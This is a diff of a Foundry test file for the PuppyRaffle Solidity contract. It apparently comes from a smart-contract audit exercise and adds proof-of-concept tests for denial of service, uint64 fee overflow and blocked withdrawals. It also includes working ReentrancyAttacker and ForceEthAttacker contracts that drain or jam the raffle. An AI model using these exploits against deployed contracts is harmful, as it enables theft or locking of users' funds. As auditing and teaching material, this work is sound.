@@ -2,7 +2,7 @@
 pragma solidity ^0.7.6;
 pragma experimental ABIEncoderV2;
 
-import {Test, console} from "forge-std/Test.sol";
+import {Test, console, console2} from "lib/forge-std/src/Test.sol";
 import {PuppyRaffle} from "../src/PuppyRaffle.sol";
 
 contract PuppyRaffleTest is Test {
@@ -15,12 +15,10 @@ contract PuppyRaffleTest is Test {
     address feeAddress = address(99);
     uint256 duration = 1 days;
 
+    event RaffleEnter(address[] newPlayers);
+
     function setUp() public {
-        puppyRaffle = new PuppyRaffle(
-            entranceFee,
-            feeAddress,
-            duration
-        );
+        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
     }
 
     //////////////////////
@@ -170,7 +168,7 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        uint256 expectedPayout = ((entranceFee * 4) * 80 / 100);
+        uint256 expectedPayout = (((entranceFee * 4) * 80) / 100);
 
         puppyRaffle.selectWinner();
         assertEq(address(playerFour).balance, balanceBefore + expectedPayout);
@@ -188,8 +186,8 @@ contract PuppyRaffleTest is Test {
         vm.warp(block.timestamp + duration + 1);
         vm.roll(block.number + 1);
 
-        string memory expectedTokenUri =
-            "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
+        string
+            memory expectedTokenUri = "data:application/json;base64,eyJuYW1lIjoiUHVwcHkgUmFmZmxlIiwgImRlc2NyaXB0aW9uIjoiQW4gYWRvcmFibGUgcHVwcHkhIiwgImF0dHJpYnV0ZXMiOiBbeyJ0cmFpdF90eXBlIjogInJhcml0eSIsICJ2YWx1ZSI6IGNvbW1vbn1dLCAiaW1hZ2UiOiJpcGZzOi8vUW1Tc1lSeDNMcERBYjFHWlFtN3paMUF1SFpqZmJQa0Q2SjdzOXI0MXh1MW1mOCJ9";
 
         puppyRaffle.selectWinner();
         assertEq(puppyRaffle.tokenURI(0), expectedTokenUri);
@@ -212,5 +210,219 @@ contract PuppyRaffleTest is Test {
         puppyRaffle.selectWinner();
         puppyRaffle.withdrawFees();
         assertEq(address(feeAddress).balance, expectedPrizeAmount);
+    }
+
+    //////////////////////
+    /// My Tests         ///
+    /////////////////////
+
+    function testIsEntryRaffleVulnToDOS() public {
+        vm.txGasPrice(1);
+
+        // First 100 users are entering
+        uint256 playersNum = 100;
+        address[] memory players = new address[](playersNum);
+
+        for (uint256 i = 0; i < playersNum; i++) {
+            players[i] = address(i);
+        }
+
+        uint256 gasStart = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
+        uint256 gasEnd = gasleft();
+
+        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
+
+        console2.log("Gas Used for first 100 players: ", gasUsedFirst);
+
+        // second 100 users are entering
+        uint256 legitPlayersNum = 100;
+        address[] memory legitPlayers = new address[](legitPlayersNum);
+
+        for (uint256 i = 0; i < legitPlayersNum; i++) {
+            legitPlayers[i] = address(i + playersNum + 1);
+        }
+
+        uint256 gasStart2 = gasleft();
+        puppyRaffle.enterRaffle{value: entranceFee * legitPlayersNum}(
+            legitPlayers
+        );
+        uint256 gasEnd2 = gasleft();
+
+        uint256 gasUsedSecond = (gasStart2 - gasEnd2) * tx.gasprice;
+
+        console2.log("Gas Used for second 100 players: ", gasUsedSecond);
+
+        assert(gasUsedFirst < gasUsedSecond);
+    }
+
+    function testReentrancyOnRefund() public {
+        uint256 numOfPlayers = 5;
+        address[] memory players = new address[](numOfPlayers);
+
+        for (uint256 i = 0; i < numOfPlayers; i++) {
+            players[i] = address(i);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * numOfPlayers}(players);
+
+        uint256 raffleInitialBalance = address(puppyRaffle).balance;
+
+        ReentrancyAttacker attacker = new ReentrancyAttacker(puppyRaffle);
+        vm.deal(address(attacker), 1 ether);
+        uint256 attackerInitialBalance = address(attacker).balance;
+
+        attacker.attack();
+
+        uint256 raffleFinalBalance = address(puppyRaffle).balance;
+        uint256 attackerFinalBalance = address(attacker).balance;
+
+        console2.log("raffleInitial Balance: ", raffleInitialBalance);
+        console2.log("raffleFinal Balance: ", raffleFinalBalance);
+
+        console2.log("attacker initial balance: ", attackerInitialBalance);
+        console2.log("Attacker Final Balance: ", attackerFinalBalance);
+
+        assertEq(raffleFinalBalance, 0);
+        assertEq(
+            raffleInitialBalance + attackerInitialBalance,
+            attackerFinalBalance
+        );
+    }
+
+    function testLossOfFeeDueToUnsafeCastingAndOverflow() public {
+        uint256 myPlayersLength = 120;
+        address[] memory myPlayers = new address[](myPlayersLength);
+
+        for (uint256 i = 0; i < myPlayersLength; i++) {
+            myPlayers[i] = address(i + 100);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * myPlayersLength}(
+            myPlayers
+        );
+
+        vm.warp(block.timestamp + puppyRaffle.raffleDuration());
+
+        puppyRaffle.selectWinner();
+
+        uint256 correctFee = (entranceFee * myPlayersLength * 20) / 100;
+        uint256 feeAfterOverFlow = correctFee % 2 ** 64; // formula to casting bigvalues to uint64
+        console2.log("Correct Fee: ", correctFee);
+        console2.log("Actual Fee: ", uint256(puppyRaffle.totalFees()));
+        console2.log("Calculated fee after overflow: ", feeAfterOverFlow);
+        assert(correctFee > puppyRaffle.totalFees());
+        assertEq(feeAfterOverFlow, puppyRaffle.totalFees());
+    }
+
+    function testCanAttackerBlockFeesWithdrawalThroughSelfDestructAttack()
+        public
+    {
+        uint256 playersNum = 10;
+        address[] memory myPlayers = new address[](playersNum);
+
+        for (uint i = 0; i < playersNum; i++) {
+            myPlayers[i] = address(i + 1012);
+        }
+
+        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(myPlayers);
+
+        vm.warp(block.timestamp + puppyRaffle.raffleDuration() + 100);
+
+        puppyRaffle.selectWinner();
+
+        uint256 initialRaffleBalance = address(puppyRaffle).balance;
+        uint256 raffleFeeToWithdraw = puppyRaffle.totalFees();
+
+        // Attacking raffle
+        uint256 ethAmountToForce = 2 ether;
+        ForceEthAttacker attackerContract = new ForceEthAttacker(
+            address(puppyRaffle)
+        );
+        vm.deal(address(attackerContract), ethAmountToForce);
+        attackerContract.destructMe();
+
+        uint256 raffleBalanceAfterAttack = address(puppyRaffle).balance;
+
+        assertEq(initialRaffleBalance, raffleFeeToWithdraw); // initially (before owner can withdraw fee)
+        assertEq(
+            raffleBalanceAfterAttack,
+            initialRaffleBalance + ethAmountToForce
+        ); // after the balance will be increase by forcedAmount
+        assert(raffleBalanceAfterAttack > raffleFeeToWithdraw); // so raffleBalance > totalFees and the owner can't withdraw fee forever
+
+        vm.expectRevert("PuppyRaffle: There are currently players active!"); // even though there are no currently active players
+        puppyRaffle.withdrawFees();
+    }
+
+    function testWillTransactionCrashIfEmptyPlayersIsSuppliedInEnterRaffle()
+        public
+    {
+        address[] memory myPlayers = new address[](0);
+
+        vm.expectRevert(); // OutOfGas
+        puppyRaffle.enterRaffle{value: 0}(myPlayers);
+    }
+
+    function testWillEnterRaffleEmitEventEvenIfEmptyListIsSupplied() public {
+        address[] memory myPlayers = new address[](1);
+
+        myPlayers[0] = address(1 + 124);
+
+        puppyRaffle.enterRaffle{value: entranceFee}(myPlayers);
+
+        address[] memory emptyPlayers = new address[](0);
+
+        vm.expectEmit();
+        emit RaffleEnter(emptyPlayers);
+        puppyRaffle.enterRaffle{value: 0}(emptyPlayers);
+    }
+}
+
+contract ReentrancyAttacker {
+    PuppyRaffle private puppyRaffle;
+    uint256 private myIndex;
+    uint256 private entranceFee;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        myIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(myIndex);
+    }
+
+    function _stealMoney() internal {
+        if (
+            msg.sender == address(puppyRaffle) &&
+            address(puppyRaffle).balance >= 1
+        ) {
+            puppyRaffle.refund(myIndex);
+        }
+    }
+}
+
+contract ForceEthAttacker {
+    address private puppyRaffleAddr;
+
+    constructor(address _puppyRaffleAddr) {
+        puppyRaffleAddr = _puppyRaffleAddr;
+    }
+
+    function destructMe() public {
+        selfdestruct(payable(puppyRaffleAddr));
     }
 }
